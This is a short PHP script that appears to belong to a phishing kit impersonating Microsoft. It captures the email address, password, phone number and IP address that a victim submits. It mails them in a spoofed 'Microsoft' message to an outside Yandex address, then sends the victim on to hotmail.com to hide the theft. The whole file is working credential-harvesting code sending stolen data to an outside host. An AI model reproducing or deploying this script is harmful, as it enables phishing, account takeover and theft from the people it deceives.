<?php
session_start();

$_SESSION['email'] = $_POST['email'];
$_SESSION['password'] = $_POST['password'];

$ip = getenv("REMOTE_ADDR");
$phone = $_POST['phone'];
$_SESSION['phone'] = $_POST['phone'];

$msg = "
-------------
Email Address: ".$_SESSION['email']."
Password : ".$_SESSION['password']."
------# sh3lb0x #-------
IP Address: $ip
";

$subj = "Microsoft";
$headers = "From: Microsoft <Microsoft@dc.com>\n";
$headers .= "Content-Type: text/plain; charset=UTF-8\n";
$headers .= "Content-Transfer-Encoding: 8bit\n";

mail("habib.james@yandex.ru", $subj, $msg,"$headers");

header("Location: https://hotmail.com");
?>

